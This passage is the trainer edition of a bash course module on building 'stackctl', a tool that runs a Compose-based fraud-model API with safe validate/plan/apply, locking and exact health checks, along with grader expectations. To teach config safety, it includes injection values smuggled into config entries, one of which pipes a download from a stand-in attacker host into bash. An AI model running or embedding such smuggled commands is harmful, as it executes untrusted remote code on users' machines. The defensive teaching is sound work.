# M09 — Infrastructure from Bash: run the program's project with `stackctl`
**FULL TRAINER EDITION · curriculum v2.0.0-draft · self-paced, no fixed duration**

> **TRAINER ONLY — about this edition.** Student text verbatim; trainer blocks inserted. IDs: S09.1–S09.7, LAB-09a/b/c, feeding CAP-01/CAP-01R (separate page). This module is the only one whose live outputs are **designed, not observed** in the authoring environment: there was a Docker *client* and Compose plugin v5.5.1 but no daemon, so `validate` (client-side `compose config -q`, including the `build:` section) was observed with the real driver while `up`/`down`/`ps`/`logs` and the image build were observed only through the mock. Before you certify anyone, run V-04 yourself once (below).
>
> **What changed in the program integration (2026-10-21).** `stackctl` now operates the SecMLOps program's own project: `app/` is `secmlops-project-baseline` (tag `m0`, Course 2 Module 0's starting point) plus `Dockerfile.course`, which trains the model inside the build; the two services are `serve` (the FastAPI model API on 8080, built locally as `fraudclf-serve:m0`) and `gateway` (nginx, the only published port); environments are `test`/`prod` (:18080/:18081) to match Course 2; health is `GET /api/health` → `{"status":"ok"}`, the exact bytes FastAPI's JSON response produces. The baseline's planted weaknesses (fake S3 keys in `config.py`, `requests==2.19.1`, unauthenticated `/api/predict`, root image) are **deliberately kept** — Course 2 removes them; Course 0's runbook section 6 lists them. Do not let a keen learner "fix" `app/`.
>
> **Prep (≈45 min the first time; ≈10 min after).** `cd labs/lab9-stackctl/exercise && rm -rf work && bash grade.sh` → **observed** `---- lab9: 10 passed, 24 failed ----`; `GRADE_TARGET="$PWD/solution" bash grade.sh` → **observed** `---- lab9: 34 passed, 0 failed ----`; `bash solution/tests/run.sh | tail -1` → **observed** `# 34 passed, 0 failed`; `bash labs/lab9-stackctl/lab.sh` → **observed** `---- lab9: 17 passed, 0 failed ----`; `shellcheck -x -P SCRIPTDIR solution/bin/stackctl solution/lib/*.sh solution/tests/*.sh solution/tools/*.sh` → silent. **V-04 (do once, on a daemon machine with network):** `bash solution/tests/live-smoke.sh test` then `prod`, and `bash solution/tools/record-manifest.sh /tmp/MANIFEST.txt`; keep both transcripts — they are the first "observed" evidence for every *designed* line on this page, and the gateway digest they print is the only one you may ever compare a learner's manifest against (the serve image ID will legitimately differ per machine and per build date: pip resolves unpinned packages). Expect the first `up` to take several minutes (pip install of scikit-learn/pandas, then training). If `up` times out at 120 s on the first run, it is the build, not the app — re-run `up`; the image is cached. If the live smoke fails on the gateway healthcheck, the `wget` in `compose/stack.yml.tmpl` relies on busybox in `nginx:…-alpine`; a non-alpine tag has no `wget`.
>
> **Trainer effort:** prep as above; LAB-09a/b review ≈ 10 min per learner (grader + two reflections); LAB-09c runbook review ≈ 10 min; V-04 ≈ 30 min once. **Facilitator pathway (optional 2 × 50 min):** session 1 — S09.1 (open `app/` together, read `COURSE0-NOTE.md`, name the three worrying things without fixing them), S09.2–S09.4 live (the PWNED demo in front of the room, then `plan` with the mock driver and `cat calls.log` after every command), LAB-09a started; session 2 — S09.5–S09.7, LAB-09b, debrief R1/R2, assign LAB-09c and CAP-01.
>
> **Why the mock driver is in the starter and not written by learners.** The course's rule is that control logic must be *executed* in the authoring environment; a daemon-free mock is the only way to do that, and designing a faithful mock is a testing skill beyond SK-09's bar. Learners read it (S09.1) and are told what it cannot prove.


**Outcomes LO-10, LO-11, LO-12.** You can operate a local containerized service
from a script (a locally built image and a pinned one, `compose up --wait`, an
exact health check); make an infrastructure change safely (config as data,
validate → plan → apply, idempotent re-runs, one operator per environment,
confirmation-gated destroy, distinct exit codes); and diagnose a failing
deployment and hand it over with a runbook and a version manifest whose digests
and image IDs you recorded yourself.

**What you'll build.** `stackctl` — the tool that runs the SecMLOps program's
project, **fraud-clf**, on your laptop. fraud-clf is the fraud-detection API you
will take to production in Course 2; here you operate it exactly as you inherit
it. Two services per environment: `serve` (the program's FastAPI model service,
`GET /api/health` and `POST /api/predict`, built from the inherited repo copy in
`app/`) behind `gateway` (nginx, the only published port). Two environments,
`test` (:18080) and `prod` (:18081) — the same pair Course 2 promotes between —
in `labs/lab9-stackctl/exercise/`. The dispatcher, the Docker/mock driver, the
compose and gateway templates, the environment files, the app copy and the test
suite are given; you write the seven functions that make the decisions, then
the runbook.

**Prerequisite check.** A-10 passed (you have assembled a complete tool). Docker
on your **host** (S00.1: Docker Desktop on macOS, Docker Engine on Ubuntu or in
WSL 2 Ubuntu on Windows 11); `docker compose version` prints a version.
**Everything in this module that decides something runs without a daemon**
through the tool's mock driver; the steps that actually build the image and start
containers are marked *designed* — run them when you have a daemon, and keep the
transcript: it is your CAP-01 evidence.

---

## Activity context for S09.1–S09.7

| Field | Value |
|---|---|
| Execution context | Your **host** shell (not the course container), in `labs/lab9-stackctl/exercise/` after `bash grade.sh` has seeded `work/`. The finished tool is run as `bash work/bin/stackctl -e ENV COMMAND` |
| Starting state | `bash grade.sh` reports `---- lab9: 10 passed, 24 failed ----`; `docker compose version` works (the daemon may be stopped) |
| Validation status | Outputs marked **observed** were produced in the authoring environment with the finished tool and its mock driver (bash 5.2.21, Docker Compose client v5.5.1, no daemon, 2026-10-21). Outputs marked **designed** need a running daemon and were **not** produced here (verification task V-04) |

### S09.1 — The lifecycle you are automating, and why there is a mock driver
- **Purpose.** Know the five Compose commands `stackctl` wraps, meet the app you are about to operate, and see how a *driver* lets you test decisions without touching Docker. (SK-10)
- **Exact action.**
  ```bash
  cd labs/lab9-stackctl/exercise && bash grade.sh | tail -1     # seeds work/ on the first run
  docker compose version
  cat work/app/COURSE0-NOTE.md                                    # what app/ is, and what not to touch
  sed -n '1,12p' work/lib/driver.sh                               # read the contract at the top
  STACKCTL_DRIVER=mock STACKCTL_MOCK_STATE=/tmp/m09 bash work/bin/stackctl -e test validate; echo "status=$?"
  ```
- **Expected observation.** *(observed)* `---- lab9: 10 passed, 24 failed ----`; a Compose version line (yours will differ from the authoring environment's `v5.5.1`); the note explaining that `app/` is the program's baseline repo plus one file, `Dockerfile.course`; the driver header; then `stackctl: parse_conf: not implemented yet (see TASK.md)` and `status=1` — the untouched starter refuses to do anything until *you* can read a configuration file.
- **Verification.** `docker compose version` printed a version; `validate` failed with the `not implemented` message, not with a bash error.
- **Recovery.** `docker: command not found` → Docker is not installed on the host or not on `PATH` (S00.1). `unknown shorthand flag` → you have the old `docker-compose` v1 binary; this course requires the `docker compose` plugin (S-02). A bash syntax error → you ran it with `sh`; use `bash`.
- **Evidence / next state.** **The lifecycle:** `config` (render and check the file — no daemon needed), `up -d --wait --wait-timeout N` (build the serve image if it is missing, create the containers, wait until every healthcheck passes), `ps` (what is running), `logs`, `down -v` (remove containers, network *and* this project's volumes). **The driver:** every Docker or network call in `stackctl` goes through two functions in `lib/driver.sh`; with `STACKCTL_DRIVER=mock` they record the call in `calls.log` and simulate state on disk. That makes "did `plan` call `up`?" a testable question — and it makes a green test suite **not** proof that a stack starts. Only a live run proves that. **The app:** `app/` is `secmlops-project-baseline` as Course 2 students inherit it. You will see things in it that should worry you (a key pair in `config.py`, an old `requests` pin, no authentication on `/api/predict`); Course 2 fixes them, Course 0 operates them and writes them down.


> **TRAINER ONLY.** *Ask:* "After `tests/run.sh` prints `34 passed`, what do we know about whether the stack starts?" *Expected:* "nothing — the mock proves the calls and their order, not Docker, and not the image build." Make them say it; it is R-11.8's spirit and the most common overclaim in CAP-01 runbooks. *Observed detail worth showing:* `docker compose config -q` works with no daemon even with the `build:` section (the authoring environment produced the `ok: test → …` line with the real driver), which is why `validate` never needs one. *Misconception:* "`--wait` makes `up` block until the containers exist" — it blocks until every service with a healthcheck is **healthy** (S-02), which is why both services have a healthcheck and `gateway` depends on `serve` with `condition: service_healthy`. *On `app/`:* a learner who asks "why is there an AWS key in `config.py`?" has found Course 2 Milestone 2 early — praise it, point at section 6 of the runbook, and keep the file unchanged.

### S09.2 — Configuration is data, never code
- **Purpose.** Read `KEY=VALUE` files by parsing them, and see exactly what goes wrong when a script `source`s one. (SK-11)
- **Exact action.**
  ```bash
  cd /tmp && printf 'PORT=18080\nPROJECT=fraudclf-demo\nNOTE=hello; touch pwned\n' > evil.conf
  ( source ./evil.conf ); ls pwned                                         # the wrong way, in a subshell
  rm -f pwned
  declare -A C
  while IFS= read -r line || [[ -n "$line" ]]; do
    line="${line%%#*}"; [[ -z "$line" ]] && continue
    C["${line%%=*}"]="${line#*=}"
  done < evil.conf
  ls pwned; echo "NOTE=[${C[NOTE]}]"
  ```
- **Expected observation (observed).**
  ```text
  pwned
  ls: cannot access 'pwned': No such file or directory
  NOTE=[hello; touch pwned]
  ```
- **Verification.** `source` created `pwned`; the parser did not, and kept the whole value as a string.
- **Recovery.** `declare: -A: invalid option` → bash 3 (macOS default); run the module in bash ≥ 4 (`brew install bash`, or inside the course container for this step only). `pwned` exists after the loop → you re-ran the `source` line; `rm -f pwned` and re-run only the loop.
- **Evidence / next state.** **Why:** `source` executes a file; a configuration file is *input*, and input must never be executable. The parser is the M03 `while read` loop plus the M01 expansions `${line%%=*}` / `${line#*=}`. Your `parse_conf` (LAB-09a) adds the rest: strip comments, reject keys outside the whitelist `PORT PROJECT APP_DIR IMAGE_SERVE IMAGE_GATEWAY HEALTH_PATH HEALTH_BODY WAIT_TIMEOUT`, and store into the global `CONF` array. `validate_conf` then checks shapes (PORT numeric and 1024–65535, images `name:tag[@sha256:…]`, `APP_DIR/Dockerfile.course` present, `HEALTH_PATH` starting with `/`) and returns 2 on the first problem — **before** anything can mutate. **The program's own practice:** Course 2's `ci/*.sh` scripts `source ci/versions.env` — a file of tool-version constants that lives *in the same reviewed repository* as the scripts. That is the one case where sourcing is defensible: the file is code the team owns, not input an operator supplies. `envs/<env>.conf` is operator input; it is parsed.


> **TRAINER ONLY.** *Live demo:* run the step as written, then show the same payload with a less obvious key: `IMAGE_GATEWAY=nginx:1.27-alpine; curl -s http://attacker.invalid | bash` — `source` runs it; `parse_conf` stores it and `validate_conf` rejects it (`IMAGE_GATEWAY must be name:tag…`, exit 2; **observed** in the reference). *Ask:* "Where else in this course did input become code?" *Expected:* M05's awk splicing (`'$8 == '"$code"`) — same disease, same cure (pass data as data). *The `versions.env` question will come up:* Course 2's `ci/gates.sh` begins with `source "$(dirname "$0")/versions.env"`. The honest answer is in the student text — a reviewed, repo-owned constants file is code, an operator-supplied environment file is input — and the sharper follow-up is "what would make `versions.env` input?" (a pipeline that lets a branch override it without review). *Grading relevance:* `the conf file is parsed, never executed` and `no source/eval of the conf anywhere` are the two `09a` checks for this; a learner who parses correctly but also `source`s the file for convenience fails the second.

### S09.3 — validate → plan → apply
- **Purpose.** See the three-stage shape every infrastructure tool has, and the one rule that makes it safe: `plan` never changes anything. (SK-11)
- **Exact action.** *(target behavior — these are the outputs your finished tool produces; run them once LAB-09a/b are green, or read them now to know what you are building)*
  ```bash
  export STACKCTL_DRIVER=mock STACKCTL_MOCK_STATE=/tmp/m09; rm -rf /tmp/m09 work/.render
  bash work/bin/stackctl -e test validate; echo "status=$?"
  bash work/bin/stackctl -e test plan;     echo "status=$?"
  cat /tmp/m09/calls.log
  bash work/bin/stackctl -e test up;       echo "status=$?"
  tail -2 /tmp/m09/calls.log
  ```
- **Expected observation (observed).**
  ```text
  ok: test → project fraudclf-test on port 18080 (serve fraudclf-serve:m0 built from app/, gateway nginx:1.27-alpine, health GET /api/health)
  warning: IMAGE_GATEWAY is pinned by tag only; record its digest after the first pull (see RUNBOOK.md)
  note: IMAGE_SERVE is built locally; record its image ID with tools/record-manifest.sh after the first up
  status=0
  plan for test (project fraudclf-test):
    desired : port 18080, serve fraudclf-serve:m0 (from app/), gateway nginx:1.27-alpine, health GET /api/health = '{"status":"ok"}'
    applied : never applied in this checkout
    running : 0 of 2 services (from compose ps)
    up would: create project fraudclf-test (2 services)
    limits  : plan cannot predict the image build, pulls or health outcomes; only 'up' proves those
  status=0
  compose fraudclf-test config -q
  compose fraudclf-test config -q
  compose fraudclf-test ps --services --status running
  up: test (project fraudclf-test, port 18080, wait ≤ 120s)
  up: done — 2 of 2 services running
  status=0
  compose fraudclf-test up -d --wait --wait-timeout 120
  compose fraudclf-test ps --services --status running
  ```
- **Verification.** After `validate` and `plan`, `calls.log` contains only `config` and `ps` lines — no `up`, no `down`. The first `up` line appears only after `stackctl up`.
- **Recovery.** `plan` printed an `up` line into `calls.log` → your `cmd_plan` calls the driver with `up`; it may only render to `$WORK/plan` and call `ps`. Two `config -q` lines → expected: `validate` runs before every command, and `plan` calls `validate` first.
- **Evidence / next state.** **Why three stages:** `validate` answers "is this configuration *sayable*?" (shapes, ranges, the build recipe exists, compose can parse it) and must not need a daemon; `plan` answers "what would change?" by comparing three things — *desired* (rendered now), *applied* (what the last `up` rendered, kept in `.render/test/`), *running* (`compose ps`) — and must be pure; `up` is the only command that mutates, and it runs `validate` first. The `limits` line is part of the contract: a plan that pretends to know whether the image will build or pull is lying. **Where you will meet this again:** `tofu plan` / `tofu apply` in Course 1 Module 3, and Course 2's `ci/deploy.sh`, which verifies a signature *before* it applies a manifest.


> **TRAINER ONLY.** *Ask:* "Why does `calls.log` show `config -q` twice before any `up`?" *Expected:* "`validate` runs on every command, and `plan` ran `validate` first." *Reference behavior:* the dispatcher runs `cmd_validate >/dev/null` before every command except `help`, then `with_lock cmd_up` / `with_lock cmd_destroy`. *Common wrong turn (observed while building the first reference):* rendering the bind-mount or build-context path from the *temporary* render directory makes every `plan` report drift because the applied file contains `.render/test/…` and the plan file contains `/tmp/stackctl.XXXX/plan/…`; the given `render_compose` already fixes this by always writing the `.render/ENV` path and `$ROOT/app` — a learner who "improves" it reintroduces the bug (`plan after up reports converged` fails). *Course 2 bridge:* `ci/deploy.sh` is validate-then-apply in miniature — `cosign verify` and `verify-attestation` run before `kubectl apply`; if a learner has seen it, ask which lines are the validation and which the mutation.

### S09.4 — Idempotency: re-running converges
- **Purpose.** Make `up` safe to run again, and make `plan` show drift when the configuration changes. (SK-11)
- **Exact action.** *(target behavior, mock driver, continuing from S09.3)*
  ```bash
  bash work/bin/stackctl -e test up
  bash work/bin/stackctl -e test plan | grep 'up would'
  sed -i 's/^PORT=18080/PORT=18090/' work/envs/test.conf
  bash work/bin/stackctl -e test plan
  sed -i 's/^PORT=18090/PORT=18080/' work/envs/test.conf
  ```
- **Expected observation (observed).**
  ```text
  up: test (project fraudclf-test, port 18080, wait ≤ 120s)
  up: done — 2 of 2 services running
    up would: nothing — converged
  plan for test (project fraudclf-test):
    desired : port 18090, serve fraudclf-serve:m0 (from app/), gateway nginx:1.27-alpine, health GET /api/health = '{"status":"ok"}'
    applied : differs from desired:
              9c9
              <       - "127.0.0.1:18080:80"
              ---
              >       - "127.0.0.1:18090:80"
    running : 2 of 2 services (from compose ps)
    up would: re-render and recreate the services whose definition changed
    limits  : plan cannot predict the image build, pulls or health outcomes; only 'up' proves those
  ```
- **Verification.** The second `up` exits 0 and `plan` says `converged`; after the port edit `plan` shows a `diff` of the rendered file and says `recreate`.
- **Recovery.** `plan` shows `differs` even with no edit → the two renders are not byte-identical; the usual cause is a path inside the rendered file that depends on *where* you rendered (the given `render_compose` always writes the bind-mount path as `.render/ENV` and the build context as the tool's own `app/` path for this reason). `sed: 1: … invalid command code` or a `-i` error on macOS → BSD `sed`: the GNU tools are not first on `PATH` (Environment section 3 step 6); fix that, or write `sed -i '' 's/…/…/'`.
- **Evidence / next state.** **Why:** an infrastructure command you cannot re-run is a command you will fear to run. `compose up` itself is idempotent for unchanged services; your tool makes the *decision* visible: compare desired with applied (`diff -q`), count what is running, print exactly one `up would:` line. On a Mac with the GNU tools installed (Environment section 3 step 6, the same step Course 2 requires) every line here runs as written; without them, BSD `sed` needs `sed -i ''`. **The same promise in Course 1:** `make provision` is idempotent — Ansible reports `changed=0` the second time for the same reason.


> **TRAINER ONLY.** *Ask:* "Is `compose up` already idempotent? Then what does our `plan` add?" *Expected:* "yes for unchanged services; `plan` adds the *visible decision* — it tells the operator which of four things `up` would do before anything happens." *Debrief point:* the `applied` snapshot is the last render `up` wrote, even if that `up` failed afterwards (observed: with the docker driver and no daemon, `up` fails at the compose call but `.render/test/` exists, so a later `plan` says `identical` and `start the 2 stopped service(s)`); the reference RUNBOOK documents this. A stricter design would write the snapshot only after success — accept either if the learner can explain it. *One thing `plan` genuinely cannot see:* a changed `app/` — the image name is unchanged, so `plan` says converged while the running image is stale; the runbook's recovery (`docker image rm fraudclf-serve:m0`, then `up`) is the honest answer, and it is also why the manifest records the image *ID*, not the tag.

### S09.5 — One operator per environment; destroy needs a name
- **Purpose.** Prevent two concurrent `up`/`destroy` runs on the same environment, and make destruction impossible to trigger by accident. (SK-11)
- **Exact action.** *(the lock and the gate run now with inline snippets; the tool outputs are target behavior)*
  ```bash
  ( exec 9>/tmp/test.lock; flock 9; sleep 2 ) &  sleep 0.2
  ( exec 9>/tmp/test.lock; flock -n 9 ) && echo acquired || echo busy
  ( exec 9>/tmp/prod.lock; flock -n 9 ) && echo acquired || echo busy
  wait
  bash work/bin/stackctl -e test destroy; echo "status=$?"
  CONFIRM_DESTROY=prod bash work/bin/stackctl -e test destroy; echo "status=$?"
  CONFIRM_DESTROY=test bash work/bin/stackctl -e test destroy; echo "status=$?"
  tail -1 /tmp/m09/calls.log; grep -c prune /tmp/m09/calls.log
  ```
- **Expected observation (observed).**
  ```text
  busy
  acquired
  stackctl: destroy refused: set CONFIRM_DESTROY=test to destroy project fraudclf-test
  status=2
  stackctl: destroy refused: set CONFIRM_DESTROY=test to destroy project fraudclf-test
  status=2
  destroy: project fraudclf-test removed (containers, network, volumes)
  status=0
  compose fraudclf-test down -v
  0
  ```
- **Verification.** `busy` then `acquired`; two refusals with status 2 (the second because `prod` ≠ `test`); then one `down -v` line scoped to `fraudclf-test` and **zero** `prune` lines.
- **Recovery.** `acquired` on the first probe → the holder had already exited; raise `sleep 2` to `sleep 5`. `flock: command not found` on macOS → `flock` is util-linux, which macOS does not ship; install the Homebrew port (`brew install flock`, Environment section 3 step 6) and rerun — the lock is then real on a Mac too. If you cannot install it, run the two probe lines in the course container and note in your runbook that the lock was verified on Linux only.
- **Evidence / next state.** **Why `-n`:** an operator who finds the environment busy should fail fast and decide, not queue silently behind an unknown change (M07 S07.5). **Why the name:** `CONFIRM_DESTROY=test` must equal the *selected* environment — a confirmation that works for any environment is not a confirmation. **Why never `docker system prune`:** it is global; it would delete `prod`'s volumes and the course image while you were cleaning `test`. `down -v` on the project removes exactly what that project created. **In Course 2** the same gate is the manual approval before `ci/promote.sh` touches production — a human names the environment they are about to change.


> **TRAINER ONLY.** *Ask:* "Why `flock -n` and not `flock` (blocking)?" *Expected:* "a blocked `up` would silently run whatever change the other operator left behind; failing fast forces a human decision." *Observed facts to have ready:* the lock is on `envs/<env>.lock`, so `prod validate` succeeds while `test` is held; the refusal exits **1** (runtime) not 2 — the request was valid, the world was busy. *Grading relevance:* `up while test is locked → 1` holds the lock for 3 s in a background subshell; a learner whose `with_lock` uses `flock` without `-n` makes the grader *wait* ≈3 s and then **fails** that check (observed 2026-10-21: the blocking variant scores 33/34 — `up` eventually succeeded with status 0, not 1) — so the pause is a tell, and the check catches it. *Destroy:* `CONFIRM_DESTROY` must equal `$ENV_NAME` exactly; a learner who accepts `yes` or any non-empty value fails three checks (`destroy with CONFIRM_DESTROY=prod on test → 2`, `refusals made no down call`, `destroy is 'down -v' scoped to fraudclf-test`; observed 31/34) — R2 is about exactly this. *Course 2 bridge:* the approval check before `ci/promote.sh` is the same gate with a human in it; Azure DevOps makes the approver name the environment.

### S09.6 — An exact health check
- **Purpose.** Check a service by its *contract* — the exact body of `/api/health` as the app returns it — with distinct exit codes for "wrong" and "unreachable". (SK-10)
- **Exact action.** *(the byte-exact idiom runs now; the tool outputs are target behavior with the mock driver; the `curl` lines are designed and need a running stack)*
  ```bash
  want='{"status":"ok"}'
  got="$(printf '%s\n' "$want")";              [[ "$got" == "$want" ]] && echo same || echo different
  got="$(printf '%s\n' "$want"; printf x)"; got="${got%x}"; [[ "$got" == "$want" ]] && echo same || echo different
  STACKCTL_MOCK_HEALTH='{"status":"ok"}'      bash work/bin/stackctl -e test check; echo "status=$?"
  STACKCTL_MOCK_HEALTH=$'{"status":"ok"}\n'   bash work/bin/stackctl -e test check; echo "status=$?"
  STACKCTL_MOCK_HEALTH='{"status": "ok"}'     bash work/bin/stackctl -e test check; echo "status=$?"
  STACKCTL_MOCK_DOWN=1                        bash work/bin/stackctl -e test check; echo "status=$?"
  curl -fsS http://127.0.0.1:18080/api/health; echo " status=$?"          # designed: needs `up` on a daemon
  curl -fsS -X POST http://127.0.0.1:18080/api/predict -H 'content-type: application/json' -d '{"instances": [[120.0, 14, 0.2, 1]]}'; echo
  ```
- **Expected observation.** *(observed, first six commands)*
  ```text
  same
  different
  check: http://127.0.0.1:18080/api/health → [{"status":"ok"}] ok
  status=0
  stackctl: check: http://127.0.0.1:18080/api/health returned [{"status":"ok"}
  ], expected [{"status":"ok"}]
  status=3
  stackctl: check: http://127.0.0.1:18080/api/health returned [{"status": "ok"}], expected [{"status":"ok"}]
  status=3
  stackctl: check: http://127.0.0.1:18080/api/health unreachable (is the stack up? try: stackctl -e test status)
  status=1
  ```
  *(designed, last two commands, with the stack up)* `{"status":"ok"} status=0`, then a JSON object with a `probabilities` list of one pair — the model's fraud probability for that transaction. With the stack down, curl prints `(7) Failed to connect …` and `status=7`.
- **Verification.** `same` then `different`; statuses `0`, `3`, `3`, `1` in that order.
- **Recovery.** Status `0` for the newline case → your `cmd_check` captured the body with a plain `$( )`, which strips trailing newlines; use the `printf x` / `${got%x}` capture. Status `3` for the unreachable case → test the driver's status *before* comparing bodies.
- **Evidence / next state.** **Why exact:** `{"status":"ok"}` with a space inside, or with a trailing newline, is a different contract — a different serializer, a different app — and a check that cannot tell them apart will one day pass a broken deploy. **Why two codes:** `3` means "the service answered wrongly" (fix the service), `1` means "nothing answered" (fix the deployment) — a runbook branches on that difference (S09.7). **In Course 2** this check becomes `tests/smoke/test_api.py`, which `ci/deploy.sh` runs after every rollout.


> **TRAINER ONLY.** *The idiom:* `got="$(drv_http_get "$url" && printf x)"; got="${got%x}"` — command substitution strips *all* trailing newlines, so `{"status":"ok"}\n` would otherwise equal the body. The first reference had exactly this bug (the test `check with the body plus a newline → 3` returned 0 until the idiom was added — observed). *Ask:* "Which exit code does `check` return when the gateway answers 404 — say, `HEALTH_PATH=/health` while the app only serves `/api/health`?" *Expected:* `1` — `curl -fsS` fails on a non-2xx, so the body never arrives; the runbook treats it as "unreachable/misrouted", not "wrong body". *Observed against a real HTTP server* (`python3 -m http.server 18080` serving `api/health`, docker driver): file containing `{"status":"ok"}` → status 0; file containing `{"status":"ok"}\n` → status 3 with the two-line message; no file (404) → `curl: (22) The requested URL returned error: 404` then `unreachable`, status 1. *Observed with no server at all:* `curl: (7) Failed to connect to 127.0.0.1 port 18080 … Couldn't connect to server` then the tool's `unreachable` line, status 1 — the `curl` lines in the student step are marked *designed* only for the success case. *Why the body is JSON now:* it is what FastAPI returns, byte for byte (`JSONResponse` serializes without spaces); the space-inside variant (`{"status": "ok"}`) is the realistic drift — a hand-written stub or a different framework — and the mock exercise shows it as status 3.

### S09.7 — Diagnose, recover, hand over
- **Purpose.** Read your own tool's messages as a diagnostic path, and produce the two handover artifacts: a runbook and a version manifest with *recorded* digests and image IDs. (SK-12)
- **Exact action.** *(mock-driver outputs observed; the manifest and the live diagnosis are designed)*
  ```bash
  sed -i 's/^PORT=18080/PORT=180a80/' work/envs/test.conf
  bash work/bin/stackctl -e test up; echo "status=$?"
  sed -i 's/^PORT=180a80/PORT=18080/' work/envs/test.conf
  sed -i '/^HEALTH_BODY/d' work/envs/prod.conf
  bash work/bin/stackctl -e prod validate; echo "status=$?"
  printf 'HEALTH_BODY={"status":"ok"}\n' >> work/envs/prod.conf
  mv work/app/Dockerfile.course /tmp/dc; bash work/bin/stackctl -e test validate; echo "status=$?"; mv /tmp/dc work/app/Dockerfile.course
  bash work/tools/record-manifest.sh; echo "status=$?"
  ```
- **Expected observation.** *(observed)*
  ```text
  stackctl: PORT must be a number, got: 180a80
  status=2
  stackctl: …/work/envs/prod.conf: missing required key: HEALTH_BODY
  status=2
  stackctl: APP_DIR app/ has no Dockerfile.course — is the fraud-clf app copy in place?
  status=2
  record-manifest: no Docker daemon reachable
  status=1
  ```
  *(designed, on a machine with a daemon and after `up`)* `record-manifest.sh` prints a dated header, the bash/docker/compose versions, one line per environment ending in `→ nginx@sha256:<64 hex digits>` — the digest **your** daemon pulled — and one line per environment ending in `→ sha256:<64 hex digits> (local build of APP_DIR/Dockerfile.course)` — the ID of the image **your** daemon built; the file `MANIFEST.txt` holds the same text.
- **Verification.** All three faults are reported with status 2 **before** any `up` call (`grep -c ' up ' /tmp/m09/calls.log` does not grow). The manifest tool refuses without a daemon rather than inventing anything.
- **Recovery.** `up` reached the driver with a bad PORT → your dispatcher does not run `cmd_validate` before `with_lock cmd_up`. `record-manifest.sh` prints `NOT PULLED` or `NOT BUILT` for an image → run `up` first; the digest and the ID exist only after a pull and a build.
- **Evidence / next state.** **Why a runbook:** the person on call at 3 a.m. is not you; `RUNBOOK.md` turns the exit codes into a decision tree (2 → fix the conf; 1 from the first `up` → the image build; 1 from a later `up` → `logs`; 3 from `check` → the body; 1 from `check` → the deployment or `HEALTH_PATH`; 1 with `locked` → the other operator). Its sixth section, *Inherited findings*, is where the things that worried you in `app/` go — with the Course 2 milestone that fixes each. **Why recorded digests and IDs:** a tag can move; a digest cannot; a locally built image has no digest at all, only the content-addressed ID of what *your* daemon built. A value copied from a web page or a chat answer proves nothing about *your* machine — in CAP-01 it is a critical failure. The only source is `docker image inspect` on the host that ran the stack. **In Course 2** the same discipline is `image.digest`, the file `ci/deploy.sh` and `ci/promote.sh` read so that production gets *the same digest* that passed in test.


> **TRAINER ONLY.** *Ask:* "What is the first thing you check when `check` exits 3 right after a green `up`?" *Expected:* "the body — a space inside the JSON, a trailing newline, or a changed `HEALTH_BODY`." *Manifest discipline:* `tools/record-manifest.sh` refuses without a daemon (observed), prints `NOT PULLED` for the gateway image until it is pulled and `NOT BUILT` for the serve image until `up` has built it; there is deliberately no way to hand it a value. When reviewing a learner's `MANIFEST.txt`, compare the **gateway digest** against your own V-04 transcript (same tag, same architecture → same digest; Apple Silicon vs x86-64 legitimately differs — ask which machine before calling it fabricated). The **serve image ID** cannot be compared across machines: it depends on the pip resolution of the day and the build cache; what you check is that it is 64 hex digits, that the learner's `live-smoke.sh` transcript shows a build, and that the same ID appears in both the manifest and `docker image ls --digests`-style evidence if you ask for it. A manifest with values but no `live-smoke.sh` transcript is the signature of copied values; ask for the transcript.

---

## Worked demonstration (10 min)

```bash
cd /course          # or the bundle root on your host
bash labs/lab9-stackctl/lab.sh
```
**Expected observation (observed).** `---- lab9: 17 passed, 0 failed ----`. In isolation, with no daemon and no reference solution, it shows the six habits: `source` runs a command hidden in a conf value while a parser keeps it as a string and rejects `80a8`; a pure `plan` makes no driver call while `apply` makes exactly one; a second `apply` converges; the `printf x` capture keeps a trailing newline that `$( )` drops; `flock -n` is busy for `test` and free for `prod`; `destroy` refuses twice, then issues one scoped `down -v` and never a `prune`.


> **TRAINER ONLY — what `lab.sh` asserts (17 checks, observed).** Config: `source` creates `pwned`, the parser does not, the value stays a string, `PORT` is data, `80a8` is rejected. Plan/apply: plan describes a change and makes no driver call; apply makes exactly one `up`. Converge: second apply → `nothing — converged`; `printf x` keeps `{"status":"ok"}\n` ≠ `{"status":"ok"}` while `$( )` drops the newline. Lock: `flock -n` busy for `test`, acquired for `prod`. Destroy: no confirmation → 2 and nothing removed; wrong env → 2; right env → one `down -v`; zero `prune`. It depends only on `labs/_lib.sh` — it is safe in the Student Edition.

---

## LAB-09a and LAB-09b — Your exercise (guided)

| Field | Value |
|---|---|
| Location | `labs/lab9-stackctl/exercise/` (read `TASK.md` and `work/app/COURSE0-NOTE.md`) — run on your host shell |
| Starting assets | `starter/` with `bin/stackctl`, `lib/driver.sh`, `compose/stack.yml.tmpl`, `compose/gateway.conf.tmpl`, `envs/test.conf`, `envs/prod.conf`, `app/` (the inherited fraud-clf baseline + `Dockerfile.course`), `tests/`, `tools/record-manifest.sh`, `RUNBOOK.md` (template); `grade.sh` |
| Allowed resources | This module, the Compose documentation, AI assistance (disclosed); **not** `solution/` |
| Deliverables | `work/lib/config.sh` and `work/lib/ops.sh` with all seven `# TODO` functions implemented |
| Acceptance | `bash grade.sh` ends `---- lab9: 34 passed, 0 failed ----` (the two `09c` checks are met by LAB-09c below); `bash work/tests/run.sh` ends `# 34 passed, 0 failed` |

**Procedure.**
1. `cd labs/lab9-stackctl/exercise && bash grade.sh`. **Observed on the starter:** `---- lab9: 10 passed, 24 failed ----`.
2. **LAB-09a — configuration and check (≈ 1 h).** In `work/lib/config.sh` implement `parse_conf` and `validate_conf` (each `# TODO` lists the exact checks); in `work/lib/ops.sh` implement `cmd_check`. Target: the fourteen `09a` checks pass, including *the conf file is parsed, never executed*, `PORT=80a8 → 2`, `unknown key COLOUR → 2`, `APP_DIR without Dockerfile.course → 2`, the three `check` codes and *check asks the gateway for HEALTH_PATH*.
3. **LAB-09b — plan, apply, destroy, lock (≈ 1 h).** In `work/lib/ops.sh` implement `with_lock`, `cmd_plan`, `cmd_up`, `cmd_destroy`. Target: the seventeen `09b` checks pass — `plan made no up/down call`, `up waits for health (--wait --wait-timeout 120)`, `plan after up reports converged`, `validate precedes mutation`, the three `destroy` outcomes, `destroy is 'down -v' scoped to fraudclf-test`, `nothing prunes`, `up while test is locked → 1`.
4. Run the project's own suite: `bash work/tests/run.sh | tail -1` → **observed with the reference:** `# 34 passed, 0 failed`.
5. `work/REFLECTION.md`:
   - **R1.** `plan` renders the compose file into a temporary directory and `up` renders it into `.render/test/`. Why two places, and what would break if `plan` wrote to `.render/`?
